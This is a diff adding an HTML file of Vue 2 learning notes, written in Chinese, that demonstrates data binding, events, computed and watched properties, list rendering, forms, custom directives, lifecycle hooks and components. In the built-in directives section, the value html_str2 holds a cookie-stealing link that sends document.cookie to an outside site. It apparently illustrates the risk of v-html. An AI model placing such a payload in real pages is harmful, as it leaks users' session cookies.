@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
+
+    <!-- HTML标题 -->
+    <title>vue笔记</title>
+
+    <!-- 引入Vue，Vue2版本 -->
+    <script type="text/javascript" src="vue.js"></script>
+    <script type="text/javascript" src="dayjs.min.js"></script>
+</head>
+
+<body>
+    <!-- root容器，也叫Vue模版 -->
+    <div id="demo">
+        <!-- 插值语法 -->
+        <h1>一、插值语法，{ { xxx } }，xxx是js表达式</h1>
+        <h3>{{name}}，{{name.toUpperCase()}}</h3>
+        <h3>时间戳转换：{{getFmtTime()}}</h3>
+        <br /><br />
+
+        <!-- 数据绑定 -->
+        <h1>二、数据绑定，数据使用"xxx"，不需要 { { xxx } }</h1>
+        <h2>单项数据绑定，v-bind:，可以简写为:</h2>
+        <!-- <input type="text" v-bind:value="name"/><br/><br/> -->
+        <input type="text" :value="name" /><br />
+        <h2>双项数据绑定，v-model:，可以简写为v-model=""</h2>
+        <!-- <input type="text" v-model:value="name"/><br/> -->
+        <input type="text" v-model="name" />
+        <h2>Vue内部通过Object.defineproperty()数据代理方法监听数据变化，从而实现双向数据绑定</h2>
+        <br /><br />
+
+        <!-- 事件 -->
+        <h1>三、事件 v-on:click、@click</h1>
+        <h2>点击事件 v-on:click，简写为：@click</h2>
+        <!-- <button v-on:click="showInfo">点我提示信息</button> -->
+        <button @click="showInfo(66)">按钮事件</button>
+        <!-- <button @click="showInfo($event, 22)">点我提示信息</button> -->
+
+        <h2>事件修饰符：prevent、stop、once、capture、self、passive</h2>
+        <!-- 阻止默认事件（常用） -->
+        <a href="http://www.baidu.com" @click.prevent="showInfo2">点我提示信息</a><br />
+        <!-- 阻止事件冒泡（常用） -->
+        <div class="demo1" @click="showInfo3">
+            <button @click.stop="showInfo3">点我提示信息</button>
+            <!-- 修饰符可以连续写 -->
+            <!-- <a href="http://www.baidu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
+        </div>
+
+        <!-- 键盘事件 -->
+        <h2>键盘事件 @keydown.enter</h2>
+        <!-- @keydown.huiche 或 @keydown.enter -->
+        <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
+        <br /><br /><br />
+
+        <!-- 计算属性 computed -->
+        <h1>四、计算属性 computed</h1>
+        数据：<input type="text" v-model="name"> <br />
+        显示：<span>{{fullName}}</span>
+        <br /><br /><br />
+
+        <!-- 监视属性 watch -->
+        <h1>五、监视属性 watch</h1>
+        姓名：<span>{{name}}</span> <br />
+        <h2>监视属性可以延时操作</h2>
+        <input type="text" v-model="name">
+        <br /><br /><br />
+
+        <!-- 条件渲染 watch -->
+        <h1>六、条件渲染 watch</h1>
+        <button @click="num++">点我num+1</button>
+        <h2>当前的值是:{{num}}</h2>
+        <!-- 使用v-show做条件渲染 -->
+        <h2 v-show="num % 2 === 0">show：{{num}}</h2>
+
+        <!-- 使用v-else和v-else-if做条件渲染 -->
+        <h2 v-if="num % 2 === 1">if：{{num}}</h2>
+        <h2 v-else-if="num % 2 === 0">else-if：{{num}}</h2>
+        <h2 v-else>else：{{num}}</h2>
+
+        <!-- v-if与template的配合使用 -->
+        <template v-if="num % 2 === 0">
+            <h2>template模板只用if</h2>
+        </template>
+        <br /><br />
+
+        <!-- 遍历数组 -->
+        <!-- 语法：v-for="(item, index) in xxx" :key="yyy" -->
+        <h1>七、遍历数组</h1>
+        <h2>遍历数组</h2>
+        <ul>
+            <li v-for="(car,index) of cars" :key="index">
+                {{car.name}}
+            </li>
+        </ul>
+        <h2>遍历对象</h2>
+        <ul>
+            <li v-for="(value,key) of car" :key="key">
+                {{key}}-{{value}}
+            </li>
+        </ul>
+        <h2>遍历字符串</h2>
+        <ul>
+            <li v-for="(char,index) of name.substring(0,3)" :key="index">
+                {{char}}-{{index}}
+            </li>
+        </ul>
+        <h2>遍历次数</h2>
+        <ul>
+            <li v-for="(number,index) of 3" :key="index">
+                {{index}}-{{number}}
+            </li>
+        </ul>
+        <h2>列表过滤</h2>
+        <input type="text" placeholder="请输入名字" v-model="keyWord">
+        <button @click="sortType = 2">年龄升序</button>
+        <button @click="sortType = 1">年龄降序</button>
+        <button @click="sortType = 0">原顺序</button>
+        <button @click="updateMei">检测数据变化-更新马冬梅的信息</button>
+        <button @click="removeMei">删除马冬梅的信息</button>
+        <ul>
+            <li v-for="(p,index) of filPerons" :key="p.id">
+                {{p.name}}-{{p.age}}-{{p.sex}}
+                <input type="text">
+            </li>
+        </ul>
+        <br /><br />
+
+        <!-- 收集表单数据 -->
+        <h1>八、收集表单数据</h1>
+        <form @submit.prevent="formClick">
+            账号：<input type="text" v-model.trim="userInfo.account"> <br />
+            密码：<input type="password" v-model="userInfo.password"> <br />
+            年龄：<input type="number" v-model.number="userInfo.age"> <br />
+            性别：
+            男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
+            女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br />
+            爱好：
+            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
+            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
+            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
+            <br />
+            所属校区
+            <select v-model="userInfo.city">
+                <option value="">请选择校区</option>
+                <option value="beijing">北京</option>
+                <option value="shanghai">上海</option>
+                <option value="shenzhen">深圳</option>
+                <option value="wuhan">武汉</option>
+            </select>
+            <br />
+            其他信息：
+            <textarea v-model.lazy="userInfo.other"></textarea> <br />
+            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
+            <button>提交</button>
+        </form>
+        <br /><br />
+
+        <!-- 内置指令 -->
+        <h1>九、内置指令</h1>
+        <h2 v-text="name"></h2>
+        <h2 v-html="html_str"></h2>
+        <h2 v-html="html_str2"></h2>
+        <h2 v-pre>v-pre 静态的标签，不使用指令语法、插值语法时</h2>
+        <h2 v-once> v-once初始化的n值是:{{num}}</h2>
+        <h2>当前的num值是:{{num}}</h2>
+        <button @click="num++">点我num+1</button>
+        <br />
+        <!-- 自定义指令 -->
+        <h2>自定义指令</h2>
+        <h2>当前的num值是：<span v-text="num"></span> </h2>
+        <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
+        <h2>放大10倍后的num值是：<span v-big="num"></span> </h2>
+        <button @click="num++">点我num+1</button>
+        <hr/>
+        <input type="text" v-fbind:value="num">
+        <br /><br /><br /><br />
+
+        <!-- 生命周期 -->
+        <h1>十、生命周期</h1>
+        <!-- <h2 :style="{opacity}">定时器透明度</h2> -->
+        <button @click="opacity = 1">透明度设置为1</button>
+        <button @click="stop">点我停止变换</button>
+
+        <!-- 组件 -->
+        <h1>十一、组件</h1>
+        <school></school>
+
+        <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+    </div>
+
+    <!-- js代码 -->
+    <script type="text/javascript">
+        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+        Vue.config.keyCodes.huiche = 13 //定义了一个别名按键
+        //定义全局指令
+		/* Vue.directive('fbind',{
+			//指令与元素成功绑定时（一上来）
+			bind(element,binding){
+				element.value = binding.value
+			},
+			//指令所在元素被插入页面时
+			inserted(element,binding){
+				element.focus()
+			},
+			//指令所在的模板被重新解析时
+			update(element,binding){
+				element.value = binding.value
+			}
+		}) */
+        // 组件使用
+        // 全局注册组件 Vue.component('school',school)
+        //第一步：创建school组件
+		const school = Vue.extend({
+			template:`
+				<div>
+					<h2>学校名称：{{cschoolName}}</h2>
+					<button @click="showName">点我提示学校名</button>	
+				</div>
+			`,
+			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
+			data(){
+				return {
+					cschoolName:'xuexiaomingcheng',
+				}
+			},
+			methods: {
+				showName(){
+					alert(this.cschoolName)
+				}
+			},
+		})
+        const vm = new Vue({
+            el: '#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
+            data: { //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
+                name: 'zhangsan',
+                num: 10,
+                persion: {
+                    mingzi: "mz"
+                },
+                cars: [
+                    { id: '001', name: '奔驰' },
+                    { id: '002', name: '宝马' }
+                ],
+                car: {
+                    name: '奥迪',
+                    price: '70万',
+                },
+                keyWord: '',
+                sortType: 0,
+                persons: [
+                    { id: '001', name: '马冬梅', age: 19, sex: '女' },
+                    { id: '002', name: '周冬雨', age: 20, sex: '女' },
+                    { id: '003', name: '周杰伦', age: 30, sex: '男' },
+                    { id: '004', name: '温兆伦', age: 18, sex: '男' }
+                ],
+                userInfo:{
+					account:'',
+					password:'',
+					age:18,
+					sex:'female',
+					hobby:[],
+					city:'beijing',
+					other:'',
+					agree:''
+				},
+                time:1621561377603, //时间戳
+                html_str:'<h3>你好</h3>',
+				html_str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>链接</a>',
+                opacity:1,
+            },
+            methods: {
+                showInfo(value) {
+                    console.log(value)
+                },
+                showInfo2() {
+                    alert("弹窗2")
+                },
+                showInfo3() {
+                    alert("弹窗3")
+                },
+                updateMei() {
+                    // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不生效
+                    // this.persons[0].name = '马老师' //生效，调用了set方法
+                    this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男' }) //生效，操作数组需要指定方法vue才能知道
+                    // vue的set方法
+                    // this.name = 'hhh'
+                    // this.$set(this.persion,'nianling',30)
+                },
+                removeMei() {
+                    this.persons = this.persons.filter((p) => {
+                        return p.name !== '马冬梅'
+                    })
+                },
+                formClick(){
+					console.log(JSON.stringify(this.userInfo))
+				},
+                getFmtTime(){
+					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+				},
+                stop(){
+					this.$destroy()
+				}
+            },
+            computed: {
+                /* fullName: {
+                    //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
+                    //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
+                    get() {
+                        console.log('get被调用了')
+                        return this.name + '-'
+                    },
+                    //set什么时候调用? 当name被修改时。
+                    set(value) {
+                        console.log('set', value)
+                        const arr = value.split('-')
+                        this.name = arr[0]
+                    }
+                }, */
+                //简写，只读取不修改时
+                fullName() {
+                    console.log('get被调用了')
+                    return this.name + '-'
+                },
+                filPerons() {
+                    const arr = this.persons.filter((p) => {
+                        return p.name.indexOf(this.keyWord) !== -1
+                    })
+                    //判断一下是否需要排序
+                    if (this.sortType) {
+                        arr.sort((p1, p2) => {
+                            return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
+                        })
+                    }
+                    return arr
+                }
+            },
+            // 监视及深度监视-写法一
+            watch: {
+                // 'persion.mingzi' 深度监视-写法一，直接写属性内部的属性
+                /* name: {
+                    immediate:true, //初始化时让handler调用一下
+                    // deep:true,//深度监视-写法二
+                    //handler什么时候调用？当name发生改变时。
+                    handler(newValue,oldValue){
+                        console.log('name被修改了',newValue,oldValue)
+                    }
+                }, */
+                name(val) {
+                    setTimeout(() => {
+                        console.log(this)
+                        this.persion.mingzi = val + '===='
+                    }, 1000);
+                },
+            },
+            // 自定义指令
+            directives:{
+				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
+				/* 'big-number'(element,binding){}, */
+				big(element,binding){
+					console.log('big',this) //注意此处的this是window
+					// console.log('big')
+					element.innerText = binding.value * 10
+				},
+				fbind:{
+					//指令与元素成功绑定时（一上来）
+					bind(element,binding){
+						element.value = binding.value
+					},
+					//指令所在元素被插入页面时
+					inserted(element,binding){
+						element.focus()
+					},
+					//指令所在的模板被重新解析时
+					update(element,binding){
+						element.value = binding.value
+					}
+				}
+			},
+			beforeCreate() {
+				console.log('beforeCreate')
+			},
+			created() {
+				console.log('created')
+			},
+			beforeMount() {
+				console.log('beforeMount')
+			},
+			mounted() {
+                //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
+				console.log('mounted')
+                // this.timer = setInterval(() => {
+				// 	console.log('setInterval')
+				// 	this.opacity -= 0.01
+				// 	if(this.opacity <= 0) this.opacity = 1
+				// },16)
+			},
+			beforeUpdate() {
+				console.log('beforeUpdate')
+			},
+			updated() {
+				console.log('updated')
+			},
+			beforeDestroy() {
+				console.log('beforeDestroy')
+                // clearInterval(this.timer)
+			},
+			destroyed() {
+				console.log('destroyed')
+			},
+            //第二步：注册组件（局部注册）
+            components:{ school }
+        })
+        // 监视及深度监视-写法二
+        vm.$watch('persion.mingzi', { // 'name'
+            immediate: true, //初始化时让handler调用一下
+            // deep:true,//深度监视-写法二
+            //handler什么时候调用？当mingzi发生改变时。
+            handler(newValue, oldValue) {
+                console.log('mingzi被修改了', newValue, oldValue)
+            }
+        })
+
+        // Object.defineProperty
+        /* let person = {
+            age: 22
+        }
+        // console.log(person)
+        Object.defineProperty(person, 'age', {
+            //读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
+            get() {
+                console.log('读取age属性了')
+                return age
+            },
+            //修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
+            set(value) {
+                console.log('修改了age属性，且值是', value)
+                age = value
+            }
+        }) */
+    </script>
+</body>
+
+</html>
